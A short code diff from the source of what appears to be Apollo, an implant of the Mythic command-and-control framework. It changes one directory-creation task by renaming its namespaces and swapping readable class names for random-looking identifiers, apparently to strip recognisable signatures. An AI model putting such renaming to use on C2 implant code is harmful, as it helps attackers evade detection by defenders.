@@ -6,9 +6,9 @@
 
 #if MKDIR
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System;
 using System.IO;
 using System.Runtime.Serialization;
@@ -16,10 +16,10 @@ using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class mkdir : Tasking
+    public class TacticalGateway588F : Tasking
     {
         [DataContract]
-        internal struct MkdirParameters
+        internal struct OptimizedWorker4D36
         {
             [DataMember(Name = "path")] public string Path;
         }
